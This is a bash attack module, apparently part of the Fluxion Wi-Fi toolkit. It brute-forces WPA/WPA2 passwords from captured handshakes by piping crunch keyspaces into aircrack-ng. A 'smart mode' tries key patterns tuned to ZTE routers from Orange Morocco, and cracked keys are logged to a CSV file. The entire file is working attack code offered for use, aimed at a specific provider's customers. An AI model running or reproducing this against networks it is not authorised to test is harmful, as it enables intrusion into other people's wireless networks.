#!/usr/bin/env bash

# identifier: Bruteforce Attack
# description: Crack WPA/WPA2 password using pattern-based wordlists (Smart mode for ZTE)

# ============================================================ #
# ================ < Bruteforce Parameters > ================= #
# ============================================================ #

BruteforceState="Not Ready"

# ZTE Orange Morocco password patterns (priority order)
# Most common: 8 digits → 8 uppercase+digits → 12 → 18 → 24
declare -a ZTE_SMART_PATTERNS=(
  "8:0123456789"                                           # 8 chiffres (le plus commun)
  "8:ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"                 # 8 maj+chiffres
  "12:0123456789"                                          # 12 chiffres
  "12:ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"                # 12 maj+chiffres
  "10:0123456789"                                          # 10 chiffres
  "10:ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"                # 10 maj+chiffres
  "18:ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"                # 18 maj+chiffres
  "24:ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"                # 24 maj+chiffres
)

# Character sets for manual mode
declare -rA BruteforceCharsets=(
  ["numeric"]="0123456789"
  ["alpha_upper"]="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  ["upper_numeric"]="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  ["alpha_lower"]="abcdefghijklmnopqrstuvwxyz"
  ["alphanum_lower"]="abcdefghijklmnopqrstuvwxyz0123456789"
  ["alphanum_mixed"]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  ["full"]="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#\$%^&*"
)

# ============================================================ #
# ============== < Bruteforce Helper Functions > ============= #
# ============================================================ #
bruteforce_header() {
  fluxion_header
  fluxion_target_show
  echo
}

# Estimate time for bruteforce
bruteforce_estimate_time() {
  local length=$1
  local charset_size=$2
  local keys_per_sec=${3:-5000}  # aircrack-ng ~5000 keys/s on average CPU
  
  local total_keys=$(echo "$charset_size^$length" | bc 2>/dev/null || echo "999999999999")
  local seconds=$(echo "$total_keys / $keys_per_sec" | bc 2>/dev/null || echo "0")
  
  if [ "$seconds" -lt 60 ]; then
    echo "${seconds}s"
  elif [ "$seconds" -lt 3600 ]; then
    echo "$((seconds / 60))m"
  elif [ "$seconds" -lt 86400 ]; then
    echo "$((seconds / 3600))h"
  else
    echo "$((seconds / 86400))d"
  fi
}

# ============================================================ #
# ============= < Smart Mode for ZTE Orange > ================ #
# ============================================================ #

bruteforce_smart_crack() {
  local hashPath="$1"
  local targetMAC="$2"
  local targetSSID="$3"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  local logFile="$FLUXIONWorkspacePath/bruteforce.log"
  local resultFile="$FLUXIONWorkspacePath/bruteforce_result.txt"
  
  local now=$(env -i date '+%H:%M:%S')
  echo -e "[$now] ${CGrn}=== SMART MODE ZTE ORANGE MAROC ===${CClr}" > "$logFile"
  echo -e "[$now] Target: $targetSSID ($targetMAC)" >> "$logFile"
  echo -e "[$now] Testing ${#ZTE_SMART_PATTERNS[@]} patterns optimized for ZTE routers" >> "$logFile"
  echo "" >> "$logFile"
  
  # Display log viewer
  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
    -title "SMART Bruteforce - ZTE Orange Maroc" -e \
    "tail -f \"$logFile\"" &
  local logViewerPID=$!
  
  local patternIndex=0
  local passwordFound=""
  
  for pattern in "${ZTE_SMART_PATTERNS[@]}"; do
    ((patternIndex++))
    
    local length="${pattern%%:*}"
    local charset="${pattern#*:}"
    local charset_size=${#charset}
    local estimate=$(bruteforce_estimate_time $length $charset_size)
    
    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now] ${CYel}[$patternIndex/${#ZTE_SMART_PATTERNS[@]}]${CClr} Testing: $length chars" >> "$logFile"
    
    if [ "$charset_size" -eq 10 ]; then
      echo -e "[$now]   Charset: NUMERIC (0-9) - Est: $estimate" >> "$logFile"
    else
      echo -e "[$now]   Charset: UPPERCASE+NUMERIC (A-Z, 0-9) - Est: $estimate" >> "$logFile"
    fi
    
    # Clear previous result
    rm -f "$resultFile"
    
    # Run crunch | aircrack-ng
    xterm $FLUXIONHoldXterm $TOPLEFTBIG -bg "#000000" -fg "#00FF00" \
      -title "Bruteforce: $length chars ($patternIndex/${#ZTE_SMART_PATTERNS[@]})" -e \
      "crunch $length $length '$charset' 2>/dev/null | aircrack-ng -b '$targetMAC' -w - '$hashPath' 2>&1 | tee '$resultFile'" &
    local crackerPID=$!
    
    # Monitor for success
    while kill -0 $crackerPID 2>/dev/null; do
      sleep 2
      
      if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
        passwordFound=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
        kill $crackerPID 2>/dev/null
        break 2  # Exit both loops
      fi
    done
    
    # Check result after process ends
    if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
      passwordFound=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
      break
    fi
    
    now=$(env -i date '+%H:%M:%S')
    echo -e "[$now]   ${CRed}Not found with this pattern${CClr}" >> "$logFile"
    echo "" >> "$logFile"
  done
  
  # Results
  now=$(env -i date '+%H:%M:%S')
  echo "" >> "$logFile"
  
  if [ "$passwordFound" ]; then
    echo -e "[$now] ${CGrn}╔════════════════════════════════════════╗${CClr}" >> "$logFile"
    echo -e "[$now] ${CGrn}║      🔓 PASSWORD FOUND! 🔓              ║${CClr}" >> "$logFile"
    echo -e "[$now] ${CGrn}╠════════════════════════════════════════╣${CClr}" >> "$logFile"
    echo -e "[$now] ${CGrn}║ $passwordFound${CClr}" >> "$logFile"
    echo -e "[$now] ${CGrn}╚════════════════════════════════════════╝${CClr}" >> "$logFile"
    
    # Save result
    mkdir -p "$FLUXIONPath/attacks/Bruteforce/cracked"
    echo "$(date '+%Y-%m-%d %H:%M:%S'),$targetSSID,$targetMAC,$passwordFound" >> \
      "$FLUXIONPath/attacks/Bruteforce/cracked/passwords.csv"
    
    # Also save to main fluxion directory for easy access
    echo "$passwordFound" > "$FLUXIONWorkspacePath/password.txt"
    
    BruteforcePasswordFound="$passwordFound"
  else
    echo -e "[$now] ${CRed}Password not found with ZTE patterns.${CClr}" >> "$logFile"
    echo -e "[$now] Try manual mode with different settings." >> "$logFile"
  fi
  
  echo "" >> "$logFile"
  echo -e "[$now] Smart bruteforce completed." >> "$logFile"
  
  # Keep log viewer open for a moment
  sleep 5
  kill $logViewerPID 2>/dev/null
}

# ============================================================ #
# ================ < Bruteforce Subroutines > ================ #
# ============================================================ #

bruteforce_unset_mode() {
  BruteforceMode=""
}

bruteforce_set_mode() {
  if [ "$BruteforceMode" ]; then return 0; fi
  
  # Auto mode uses smart
  if [ "$FLUXIONAutoBruteforce" ] || [ "$FLUXIONSmartMode" ]; then
    BruteforceMode="smart"
    return 0
  fi
  
  local choices=(
    "$BruteforceSmartModeOption"
    "$BruteforceManualModeOption"
    "$FLUXIONGeneralBackOption"
  )
  
  io_query_choice "$BruteforceModeQuery" choices[@]
  
  case "$IOQueryChoice" in
    "$BruteforceSmartModeOption") BruteforceMode="smart" ;;
    "$BruteforceManualModeOption") BruteforceMode="manual" ;;
    "$FLUXIONGeneralBackOption")
      bruteforce_unset_mode
      return 1
      ;;
  esac
  
  echo
}

bruteforce_unset_charset() {
  BruteforceCharsetType=""
}

bruteforce_set_charset() {
  if [ "$BruteforceCharsetType" ]; then return 0; fi
  if [ "$BruteforceMode" = "smart" ]; then return 0; fi
  
  bruteforce_unset_charset
  
  # Use CLI parameter if provided
  if [ "$FLUXIONWordlistType" ]; then
    if [ "${BruteforceCharsets[$FLUXIONWordlistType]}" ]; then
      BruteforceCharsetType="$FLUXIONWordlistType"
      return 0
    fi
  fi
  
  local choices=(
    "$BruteforceCharsetNumericOption"
    "$BruteforceCharsetUpperNumericOption"
    "$BruteforceCharsetAlphanumMixedOption"
    "$BruteforceCharsetFullOption"
    "$FLUXIONGeneralBackOption"
  )
  
  io_query_choice "$BruteforceCharsetQuery" choices[@]
  
  case "$IOQueryChoice" in
    "$BruteforceCharsetNumericOption") BruteforceCharsetType="numeric" ;;
    "$BruteforceCharsetUpperNumericOption") BruteforceCharsetType="upper_numeric" ;;
    "$BruteforceCharsetAlphanumMixedOption") BruteforceCharsetType="alphanum_mixed" ;;
    "$BruteforceCharsetFullOption") BruteforceCharsetType="full" ;;
    "$FLUXIONGeneralBackOption")
      bruteforce_unset_charset
      return 1
      ;;
  esac
  
  echo
}

bruteforce_unset_length() {
  BruteforcePasswordLength=""
}

bruteforce_set_length() {
  if [ "$BruteforcePasswordLength" ]; then return 0; fi
  if [ "$BruteforceMode" = "smart" ]; then return 0; fi
  
  bruteforce_unset_length
  
  # Use CLI parameter if provided
  if [ "$FLUXIONPasswordLength" ]; then
    BruteforcePasswordLength="$FLUXIONPasswordLength"
    return 0
  fi
  
  local choices=(
    "$BruteforceLength8Option"
    "$BruteforceLength10Option"
    "$BruteforceLength12Option"
    "$BruteforceLength18Option"
    "$BruteforceLength24Option"
    "$BruteforceLengthCustomOption"
    "$FLUXIONGeneralBackOption"
  )
  
  io_query_choice "$BruteforceLengthQuery" choices[@]
  
  case "$IOQueryChoice" in
    "$BruteforceLength8Option") BruteforcePasswordLength=8 ;;
    "$BruteforceLength10Option") BruteforcePasswordLength=10 ;;
    "$BruteforceLength12Option") BruteforcePasswordLength=12 ;;
    "$BruteforceLength18Option") BruteforcePasswordLength=18 ;;
    "$BruteforceLength24Option") BruteforcePasswordLength=24 ;;
    "$BruteforceLengthCustomOption")
      echo -ne "$FLUXIONVLine $BruteforceLengthCustomQuery (8-63): "
      read BruteforcePasswordLength
      if ! [[ "$BruteforcePasswordLength" =~ ^[0-9]+$ ]] || \
         [ "$BruteforcePasswordLength" -lt 8 ] || \
         [ "$BruteforcePasswordLength" -gt 63 ]; then
        echo -e "$BruteforceLengthInvalidError"
        sleep 2
        bruteforce_unset_length
        return 1
      fi
      ;;
    "$FLUXIONGeneralBackOption")
      bruteforce_unset_length
      return 1
      ;;
  esac
  
  echo
}

bruteforce_unset_hash() {
  BruteforceHashPath=""
}

bruteforce_set_hash() {
  if [ "$BruteforceHashPath" ]; then return 0; fi
  
  bruteforce_unset_hash
  
  # Look for handshakes in the default location
  local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
  local defaultHash=""
  
  if [ -d "$handshakeDir" ]; then
    # Try to find a handshake matching the target
    if [ "$FluxionTargetMAC" ]; then
      defaultHash=$(ls "$handshakeDir"/*"${FluxionTargetMAC^^}".cap 2>/dev/null | head -n1)
      if [ ! "$defaultHash" ]; then
        defaultHash=$(ls "$handshakeDir"/*"${FluxionTargetMAC,,}".cap 2>/dev/null | head -n1)
      fi
    fi
    
    # If no target-specific hash, get most recent
    if [ ! "$defaultHash" ]; then
      defaultHash=$(ls -t "$handshakeDir"/*.cap 2>/dev/null | head -n1)
    fi
  fi
  
  # Auto mode: use any available hash
  if [ "$FLUXIONAutoBruteforce" ] || [ "$FLUXIONSmartMode" ]; then
    if [ "$defaultHash" ] && [ -f "$defaultHash" ]; then
      BruteforceHashPath="$defaultHash"
      return 0
    fi
  fi
  
  if ! fluxion_hash_get_path "$defaultHash" "$FluxionTargetMAC" "$FluxionTargetSSID"; then
    return 1
  fi
  
  BruteforceHashPath="$FluxionHashPath"
}

# ============================================================ #
# =============== < Bruteforce Attack Logic > ================ #
# ============================================================ #

bruteforce_manual_crack() {
  local -r charset="${BruteforceCharsets[$BruteforceCharsetType]}"
  local -r length="$BruteforcePasswordLength"
  local -r hashPath="$BruteforceHashPath"
  local -r targetMAC="$FluxionTargetMAC"
  
  source "$FLUXIONLibPath/ColorUtils.sh"
  
  local logFile="$FLUXIONWorkspacePath/bruteforce.log"
  local resultFile="$FLUXIONWorkspacePath/bruteforce_result.txt"
  
  local now=$(env -i date '+%H:%M:%S')
  echo -e "[$now] Starting manual bruteforce..." > "$logFile"
  echo -e "[$now] Charset: $BruteforceCharsetType, Length: $length" >> "$logFile"
  
  # Check crunch
  if ! command -v crunch &> /dev/null; then
    echo -e "[$now] ${CRed}Error: crunch not installed!${CClr}" >> "$logFile"
    return 1
  fi
  
  # Display log viewer
  xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg "#000000" -fg "#CCCCCC" \
    -title "Bruteforce Attack Log" -e \
    "tail -f \"$logFile\"" &
  local logViewerPID=$!
  
  # Run bruteforce
  xterm $FLUXIONHoldXterm $TOPLEFTBIG -bg "#000000" -fg "#00FF00" \
    -title "Bruteforce: $BruteforceCharsetType ($length chars)" -e \
    "crunch $length $length '$charset' 2>/dev/null | aircrack-ng -b '$targetMAC' -w - '$hashPath' 2>&1 | tee '$resultFile'" &
  BruteforceCrackerPID=$!
  
  # Monitor
  while kill -0 $BruteforceCrackerPID 2>/dev/null; do
    sleep 2
    if [ -f "$resultFile" ] && grep -q "KEY FOUND" "$resultFile" 2>/dev/null; then
      local password=$(grep "KEY FOUND" "$resultFile" | grep -oP '\[\s*\K[^\]]+' | head -1)
      now=$(env -i date '+%H:%M:%S')
      echo -e "[$now] ${CGrn}PASSWORD FOUND: $password${CClr}" >> "$logFile"
      
      mkdir -p "$FLUXIONPath/attacks/Bruteforce/cracked"
      echo "$(date '+%Y-%m-%d %H:%M:%S'),$FluxionTargetSSID,$FluxionTargetMAC,$password" >> \
        "$FLUXIONPath/attacks/Bruteforce/cracked/passwords.csv"
      
      BruteforcePasswordFound="$password"
      break
    fi
  done
  
  kill $logViewerPID 2>/dev/null
}

bruteforce_crack_daemon() {
  if [ ${#@} -lt 1 ]; then return 1; fi
  
  local -r fluxionPID=$1
  
  if [ "$BruteforceMode" = "smart" ]; then
    bruteforce_smart_crack "$BruteforceHashPath" "$FluxionTargetMAC" "$FluxionTargetSSID"
  else
    bruteforce_manual_crack
  fi
  
  sleep 3
}

# ============================================================ #
# ==================== < Fluxion Hooks > ===================== #
# ============================================================ #

attack_targetting_interfaces() {
  interface_list_wireless
  local interface
  for interface in "${InterfaceListWireless[@]}"; do
    echo "$interface"
  done
}

attack_tracking_interfaces() {
  echo "" # Skip option - tracker not needed for bruteforce
}

unprep_attack() {
  BruteforceState="Not Ready"
  
  bruteforce_unset_mode
  bruteforce_unset_length
  bruteforce_unset_charset
  bruteforce_unset_hash
  
  return 0
}

prep_attack() {
  IOUtilsHeader="bruteforce_header"
  
  # Full auto mode
  if [ "$FLUXIONAutoBruteforce" ] || [ "$FLUXIONSmartMode" ]; then
    echo "Auto-bruteforce: using SMART mode for ZTE" > $FLUXIONOutputDevice
    BruteforceMode="smart"
    
    # Use pre-selected handshake from picker if available
    if [ "$FluxionSelectedHandshake" ] && [ -f "$FluxionSelectedHandshake" ]; then
      BruteforceHashPath="$FluxionSelectedHandshake"
      echo "Using selected handshake: $BruteforceHashPath" > $FLUXIONOutputDevice
    else
      # Get handshake path from directory
      local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
      if [ -d "$handshakeDir" ]; then
        if [ "$FluxionTargetMAC" ]; then
          BruteforceHashPath=$(ls "$handshakeDir"/*"${FluxionTargetMAC^^}".cap 2>/dev/null | head -n1)
          if [ ! "$BruteforceHashPath" ]; then
            BruteforceHashPath=$(ls "$handshakeDir"/*"${FluxionTargetMAC,,}".cap 2>/dev/null | head -n1)
          fi
        fi
        if [ ! "$BruteforceHashPath" ]; then
          BruteforceHashPath=$(ls -t "$handshakeDir"/*.cap 2>/dev/null | head -n1)
        fi
      fi
    fi
    
    if [ ! "$BruteforceHashPath" ] || [ ! -f "$BruteforceHashPath" ]; then
      echo "No handshake found for auto-bruteforce" > $FLUXIONOutputDevice
      return 1
    fi
    
    BruteforceState="Ready"
    return 0
  fi
  
  local sequence=(
    "set_mode"
    "set_charset"
    "set_length"
    "set_hash"
  )
  
  if ! fluxion_do_sequence bruteforce sequence[@]; then
    return 1
  fi
  
  BruteforceState="Ready"
}

stop_attack() {
  if [ "$BruteforceCrackerPID" ]; then
    kill $BruteforceCrackerPID 2>/dev/null
  fi
  BruteforceCrackerPID=""
  BruteforceState="Stopped"
}

start_attack() {
  if [ "$BruteforceState" = "Running" ]; then return 0; fi
  if [ "$BruteforceState" != "Ready" ]; then return 1; fi
  BruteforceState="Running"
  
  bruteforce_crack_daemon $$ &> $FLUXIONOutputDevice &
  BruteforceDaemonPID=$!
}

# FLUXSCRIPT END
